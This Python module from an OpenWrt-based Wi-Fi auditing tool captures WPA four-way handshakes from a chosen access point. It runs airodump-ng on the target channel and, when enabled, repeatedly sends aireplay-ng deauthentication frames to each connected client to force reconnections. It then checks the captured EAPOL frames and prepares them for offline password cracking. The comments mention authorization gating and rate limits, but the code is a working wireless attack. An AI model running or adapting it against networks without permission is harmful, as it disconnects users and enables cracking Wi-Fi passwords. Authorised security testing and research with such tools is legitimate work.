"""OpenWrt 定向四次握手任务接口。"""

import re
import sys
import time
from dataclasses import dataclass, replace
from pathlib import Path, PurePosixPath
import shutil

from modules.capture_services.openwrt.command_builder import (
    normalize_bssid,
    normalize_channel,
    quote_argument,
)
from modules.capture_services.openwrt.device_probe import monitor_lost_note
from modules.capture_services.openwrt.models import CaptureCleanupError
from modules.capture_services.openwrt.command_runner import require_command_completion
from modules.capture_services.openwrt.radio_policy import IdleRadioUnavailable
from modules.capture_services.openwrt.result_converter import analyze_handshake_cap, handshake_content_fingerprint, CONVERTIBLE_VERDICTS, convertible_pairs
from modules.capture_services.openwrt.wifi_scanner import OpenWrtWifiScanner
from modules.capture_services.openwrt.wireless_diagnostics import (
    collect_tool_failure_diagnostics,
)

# 单轮去认证帧数与轮间隔：小剂量、多间隔；客户端上限防止打成风暴。
_DEAUTH_COUNT = 5
_DEAUTH_INTERVAL = 20
_DEAUTH_MAX_CLIENTS = 8


@dataclass(frozen=True)
class HandshakeCaptureResult:
    """H 任务保留的原始 CAP 产物。

    verdict 是本地 EAPOL 结构分析结论：complete/m1m2/pmkid（可跑包）、partial
    （零散 EAPOL）、none（确认没有）、unknown（无法判断）；verdict_detail 是一句
    话说明。结构匹配不验证 MIC，最终以跑包为准。deauth_rounds 是本次发送去认证
    的轮数（未开启为 0）。has_usable_frames 表示解析出至少一组可用帧详情
    （unknown 但有零散帧会保留文件，全空则不保留）。hc22000_path 是已生成的
    22000 文件（未生成为空），hc22000_note 说明未生成原因。
    """

    cap_path: str
    bssid: str
    ssid: str
    verdict: str = "unknown"
    verdict_detail: str = ""
    deauth_rounds: int = 0
    hc22000_path: str = ""
    hc22000_note: str = ""
    hccapx_path: str = ""
    hccapx_note: str = ""
    content_fingerprint: str = ""
    has_usable_frames: bool = False


@dataclass(frozen=True)
class HandshakeCaptureUpdate:
    """H worker 发给主线程的有限时长进度，不直接修改页面。

    多目标批量任务附加 target_label/index/total/round_no；单目标沿用默认值。
    """

    elapsed: int
    total: int
    target_label: str = ""
    target_index: int = 0
    target_total: int = 0
    round_no: int = 1
    stage: str = "capturing"
    # 当前采集目标 BSSID（调用方归一化后比较）；清理/分析等无目标阶段留空，
    # 服务层收到空值时保持上一次的绿行，避免闪烁。
    target_bssid: str = ""
    target_bssids: tuple = ()


@dataclass(frozen=True)
class DownloadedHandshake:
    """Immutable local artifacts; analysis never touches the remote connection."""

    local_cap: Path
    targets: tuple
    auxiliary_paths: tuple
    deauth_rounds: int
    grouped: bool

    def analyze(self):
        from .channel_capture import split_channel_cap
        local_cap, targets = self.local_cap, self.targets
        auxiliary_paths = dict(self.auxiliary_paths)
        bssid = normalize_bssid(targets[0].bssid)
        incomplete_tail = False
        if len(targets) > 1:
            paths, incomplete_tail = split_channel_cap(local_cap, targets, None, with_metadata=True)
        else:
            paths = {bssid: local_cap}
        results = []
        for item in targets:
            key = normalize_bssid(item.bssid)
            analysis, pairs = analyze_handshake_cap(paths[key], key)
            auxiliary = auxiliary_paths.get(key)
            if auxiliary is not None and analysis.status not in CONVERTIBLE_VERDICTS:
                auxiliary_analysis, auxiliary_pairs = analyze_handshake_cap(auxiliary, key)
                if auxiliary_analysis.status in CONVERTIBLE_VERDICTS or (not pairs and auxiliary_pairs):
                    # The auxiliary stream can serve several targets; each saved result owns its file.
                    owned = local_cap.with_name(local_cap.stem + "-" + key.replace(":", "") + "-assist.pcapng")
                    shutil.copyfile(auxiliary, owned)
                    paths[key] = owned
                    analysis, pairs = auxiliary_analysis, auxiliary_pairs
            if incomplete_tail:
                analysis = replace(analysis, content_complete=False)
            results.append(HandshakeCaptureResult(
                str(paths[key]), key, str(item.ssid or ""), analysis.status,
                analysis.detail, self.deauth_rounds,
                has_usable_frames=bool(pairs),
                content_fingerprint=handshake_content_fingerprint(analysis, pairs)))
        return tuple(results) if self.grouped else results[0]
    def release(self):
        """Release only this downloaded group's known disposable files after successful saving."""
        paths = {self.local_cap, *(Path(path) for _, path in self.auxiliary_paths)}
        for target in self.targets:
            stem = self.local_cap.stem + "-" + normalize_bssid(target.bssid).replace(":", "")
            paths.add(self.local_cap.with_name(stem + ".cap"))
            paths.add(self.local_cap.with_name(stem + "-assist.pcapng"))
        for path in paths:
            path.unlink(missing_ok=True)



class OpenWrtHandshakeCapture:
    """按目标抓取握手；主动断连必须由页面提前确认后作为普通参数传入。"""

    def __init__(self, command_runner, process_manager):
        self.command_runner = command_runner
        self.process_manager = process_manager

    def capture_passive(
        self,
        workspace,
        monitor_interface,
        session_id,
        target,
        seconds,
        workspace_manager,
        cancel_event=None,
        progress_callback=None,
        active_deauth=False,
        file_tag="",
        heal_link=None,
        *, group_targets=(),
        defer_analysis=False,
    ):
        """采集单个目标的原始 CAP，默认被动等待。

        参数：target 是已扫描的 AccessPointInfo；seconds 是有限总时长；
        active_deauth 为真时，每隔固定间隔对目标已发现客户端逐个发送少量去认证帧
        （迫使重连以产生握手），必须由页面层提前确认授权（设置开关默认关闭，
        启动确认按开关如实分支）；heal_link 透传给信道调谐校验（M 接口被关闭时
        原地修复一次）。返回
        HandshakeCaptureResult。副作用：启动并停止本任务 A 工具进程、同步原始 CAP；
        去认证使用逐条短命令（结束即退，无常驻进程可清理），取消时不再发起新一轮；
        不修改 UCI，调用方负责 M 接口和工作目录的最终清理。
        """

        from .channel_capture import group_channel_targets
        targets = tuple(group_targets) or (target,)
        groups = group_channel_targets(targets)
        if len(groups) != 1:
            raise ValueError('Capture group must share a verified band/channel.')
        bssids = tuple(normalize_bssid(t.bssid) for t in targets)
        bssid = normalize_bssid(target.bssid)
        channel = normalize_channel(target.channel)
        duration = max(5, min(int(seconds), 3600))
        client_macs = self._ordered_client_macs(target)
        tag = "".join(char for char in str(file_tag) if char.isalnum())[:32]
        prefix = PurePosixPath(workspace.remote_dir) / (f"handshake-{tag}" if tag else "handshake")
        remote_cap = PurePosixPath(f"{prefix}-01.cap")
        # 同时写 CSV：扫描快照几分钟就过期（手机休眠/漫游），去认证必须打当前
        # 在线的设备；每轮去认证前现读这份 CSV 刷新名单，读不到就沿用旧名单。
        remote_csv = PurePosixPath(f"{prefix}-01.csv")
        receive_filter = f"--bssid {quote_argument(bssid)} " if len(targets) == 1 else ""
        command = (
            "airodump-ng --background 1 "
            f"{receive_filter}--channel {channel} "
            "--write-interval 1 --output-format pcap,csv "
            f"--write {quote_argument(str(prefix))} {quote_argument(monitor_interface)}"
        )
        handle = self.process_manager.start(
            "airodump-ng",
            command,
            session_id,
            str(workspace.remote_dir),
            cancel_event,
            # 看门狗：SSH 中死没人来停时，超时后进程自杀，不无限写盘撑爆 /tmp。
            max_runtime=max(600, duration + 300),
        )
        try:
            self._verify_tuned_channel(
                handle, monitor_interface, channel, cancel_event, heal_link
            )
            started = time.monotonic()
            deadline = started + duration
            last_second = -1
            next_content_check = started + 15
            # 开关打开就每轮都尝试：初始名单可能为空（扫描时无客户端），但中途
            # 可能有设备上线，现读 CSV 后再决定打谁；全程无客户端则自然空转。
            next_deauth = started + _DEAUTH_INTERVAL if active_deauth else None
            deauth_rounds = 0
            deauth_index = 0
            clients_by_target = {t.bssid: self._ordered_client_macs(t) for t in targets}
            while time.monotonic() < deadline:
                if cancel_event is not None and cancel_event.is_set():
                    raise RuntimeError("定向握手抓包已取消。")
                if not self.process_manager.is_running(handle, cancel_event):
                    detail = self.process_manager.early_exit_detail(handle, cancel_event)
                    diag_name = collect_tool_failure_diagnostics(
                        self.command_runner,
                        workspace,
                        workspace_manager,
                        "airodump",
                        cancel_event,
                    )
                    raise RuntimeError(
                        "定向抓包进程在完成前意外退出，请检查目标信道、无线驱动和工具版本。"
                        + (f"远端日志末尾：{detail}" if detail else "")
                        + self._monitor_lost_note(monitor_interface, cancel_event)
                        + ("；无线诊断已一并保留。" if diag_name else "")
                    )
                now = time.monotonic()
                if now >= next_content_check:
                    completed = set()
                    exists = self.command_runner.run(
                        "check_live_handshake", f"test -s {quote_argument(str(remote_cap))}",
                        timeout=8, cancel_event=cancel_event,
                    )
                    require_command_completion(exists)
                    if exists.exit_code == 0:
                        live = workspace.local_dir / "handshake-live.cap"
                        try:
                            workspace_manager.download_atomic(remote_cap, live, cancel_event)
                            _, live_pairs = analyze_handshake_cap(live)
                            completed.update(ap.upper() for ap, _ in convertible_pairs(live_pairs))
                            if set(bssids).issubset(completed):
                                break
                        finally:
                            live.unlink(missing_ok=True)
                    if set(bssids).issubset(completed):
                        break
                    next_content_check = time.monotonic() + 15
                if next_deauth is not None and now >= next_deauth:
                    active_target = targets[deauth_index % len(targets)]
                    deauth_index += 1
                    active_bssid = normalize_bssid(active_target.bssid)
                    client_macs = clients_by_target[active_target.bssid]
                    live = self._refresh_live_clients(
                        workspace, workspace_manager, remote_csv, tag, active_bssid, cancel_event
                    )
                    if live:
                        client_macs = live
                        clients_by_target[active_target.bssid] = live
                    sent = self._deauth_clients(
                        active_bssid, client_macs, monitor_interface, cancel_event
                    )
                    # 只统计真正发出过帧的轮数，空转（无在线客户端）不计入。
                    if sent:
                        deauth_rounds += 1
                    next_deauth = now + _DEAUTH_INTERVAL
                elapsed = min(duration, int(time.monotonic() - started))
                if progress_callback is not None and elapsed != last_second:
                    progress_callback(HandshakeCaptureUpdate(elapsed, duration, target_bssids=bssids))
                    last_second = elapsed
                time.sleep(min(0.5, max(0.0, deadline - time.monotonic())))
        finally:
            primary_error = sys.exc_info()[1]
            cleanup_errors = []
            try:
                self.process_manager.stop(handle)
            except Exception as exc:
                cleanup_errors.append(f"停止本任务抓包进程失败：{exc}")
            if cleanup_errors:
                note = "；".join(cleanup_errors)
                raise CaptureCleanupError(
                    f"{primary_error}；{note}" if primary_error else note, tuple(cleanup_errors),
                    primary_error=primary_error if primary_error is not None else "",
                ) from primary_error
        if cancel_event is not None and cancel_event.is_set():
            raise RuntimeError("定向握手抓包已取消。")
        exists = self.command_runner.run(
            "verify_handshake_cap",
            f"test -s {quote_argument(str(remote_cap))}",
            timeout=8,
            cancel_event=cancel_event,
        )
        if exists.exit_code != 0:
            raise RuntimeError(
                "定向抓包没有生成原始 CAP，请确认目标仍在当前信道并检查无线驱动。"
            )
        local_cap = workspace.local_dir / (f"handshake-{tag}.cap" if tag else "handshake.cap")
        workspace_manager.download_atomic(remote_cap, local_cap, cancel_event)
        if defer_analysis:
            # Both producers have stopped and the atomic local download succeeded.
            removed = self.command_runner.run("release_downloaded_handshake",
                "rm -f -- " + quote_argument(str(remote_cap)) + " " + quote_argument(str(remote_csv)),
                timeout=5, cancel_event=cancel_event)
            require_command_completion(removed)
            if removed.exit_code != 0:
                raise RuntimeError("Downloaded capture could not be released on the router.")
        if progress_callback is not None:
            progress_callback(HandshakeCaptureUpdate(duration, duration, stage="analyzing"))
        downloaded = DownloadedHandshake(local_cap, targets,
            (), deauth_rounds, bool(group_targets))
        return downloaded if defer_analysis else downloaded.analyze()

    def _monitor_lost_note(self, monitor_interface, cancel_event):
        """抓包进程意外退出时复核 M 接口状态，丢失或被关闭则返回定因后缀。

        只读、不修改状态；复核本身失败返回空串，绝不污染原始错误。
        """

        return monitor_lost_note(
            self.command_runner, monitor_interface, cancel_event
        )

    def _verify_tuned_channel(
        self, handle, monitor_interface, channel, cancel_event, heal_link=None
    ):
        """确认抓包网卡已切到目标信道，最多等待约 15 秒。

        参数：handle 是本任务 A 工具句柄；channel 是目标信道；heal_link 是可选的
        无参数可调用对象，接口读不到时调用一次尝试链路修复（返回 (是否修好, 说明)
        ，修好则继续等调谐，修不好仍按旧逻辑放行）。读不到信道时放行（避免在输出
        格式特殊的驱动上误杀）；明确读到不一致的信道时抛错，调用方 finally 会停止
        抓包进程。副作用：执行只读的 `iw dev info`，修复分支会重新启用被关闭的接口。
        """

        deadline = time.monotonic() + 15
        readable = False
        last_seen = 0
        heal_tried = False
        while time.monotonic() < deadline:
            if cancel_event is not None and cancel_event.is_set():
                raise RuntimeError("定向握手抓包已取消。")
            if not self.process_manager.is_running(handle, cancel_event):
                return
            result = self.command_runner.run(
                "read_monitor_channel",
                f"iw dev {quote_argument(monitor_interface)} info 2>/dev/null",
                timeout=8,
                cancel_event=cancel_event,
            )
            if result.exit_code == 0:
                match = re.search(r"channel\s+(\d+)\s*\(", result.stdout or "")
                if match:
                    readable = True
                    last_seen = int(match.group(1))
                    if last_seen == channel:
                        return
            elif heal_link is not None and not heal_tried:
                # 接口读不到：先给一次链路修复机会（被关闭可原地修好，不影响
                # running 进程）；修不好或本就读不出详情的驱动仍按旧逻辑放行。
                heal_tried = True
                try:
                    healed, _note = heal_link()
                except IdleRadioUnavailable:
                    raise
                except Exception:
                    healed = False
                if healed:
                    continue
            time.sleep(1)
        if readable:
            raise RuntimeError(
                f"网卡未能切到目标信道 {channel}（当前在信道 {last_seen}）。"
                "如该频段被路由器自身无线占用，请确认接管后重试，或改用与本机同信道目标。"
            )

    @staticmethod
    def _ordered_client_macs(target):
        """返回按信号强度排序的客户端 MAC 列表，最多取前若干个。

        参数：target 是已扫描的 AccessPointInfo。格式非法的 MAC 直接丢弃；
        信号未知按最弱处理。调用方用它决定每轮定点去认证的对象。
        """

        scored = []
        for client in getattr(target, "clients", ()) or ():
            try:
                mac = normalize_bssid(getattr(client, "mac", ""))
            except ValueError:
                continue
            power = getattr(client, "power", None)
            scored.append((-(power if isinstance(power, int) else -999), mac))
        scored.sort()
        seen = []
        for _score, mac in scored:
            if mac not in seen:
                seen.append(mac)
            if len(seen) >= _DEAUTH_MAX_CLIENTS:
                break
        return seen

    def _refresh_live_clients(
        self, workspace, workspace_manager, remote_csv, tag, bssid, cancel_event
    ):
        """从远端现抓 CSV 读取客户端；可选文件未产生时沿用原名单。

        连接、传输失败及取消必须保留原始异常并终止任务，不能继续发送。
        本地解析失败或目标无客户端时沿用旧名单。
        """

        if cancel_event is not None and cancel_event.is_set():
            raise InterruptedError("刷新客户端名单已取消。")
        local_csv = workspace.local_dir / (f"handshake-{tag}-live.csv" if tag else "handshake-live.csv")
        try:
            workspace_manager.download_atomic(remote_csv, local_csv, cancel_event)
        except FileNotFoundError:
            return ()
        try:
            points = OpenWrtWifiScanner.parse_csv(local_csv, "")
        except Exception:
            return ()
        for point in points:
            if point.bssid.upper() == bssid.upper():
                return self._ordered_client_macs(point)
        return ()

    def _deauth_clients(self, bssid, client_macs, monitor_interface, cancel_event):
        """对给定客户端逐个发送定点去认证小包，返回成功轮数。

        每条都是打完即退的短命令，没有常驻进程可管理；轮与轮之间检查取消，
        取消后不再发起新一轮。永远逐个定点（-c），绝不发广播去认证。
        命令返回失败只跳过该客户端；连接或传输异常直接终止，保留首次故障。
        """

        if cancel_event is not None and cancel_event.is_set():
            raise RuntimeError("定向握手抓包已取消。")
        interface = str(monitor_interface or "").strip()
        if not interface:
            return 0
        sent = 0
        for mac in client_macs:
            if cancel_event is not None and cancel_event.is_set():
                raise RuntimeError("定向握手抓包已取消。")
            command = (
                "aireplay-ng "
                f"-0 {_DEAUTH_COUNT} -a {quote_argument(bssid)} "
                f"-c {quote_argument(mac)} {quote_argument(interface)} "
                "--ignore-negative-one"
            )
            result = self.command_runner.run(
                "deauth_client", command, timeout=15, cancel_event=cancel_event
            )
            if result.cancelled:
                raise RuntimeError("定向握手抓包已取消。")
            require_command_completion(result)
            if result.exit_code == 0:
                sent += 1
            # 与 Mint 原版一致：客户端之间间隔 1 秒，避免连续注入。
            time.sleep(1)
        return sent
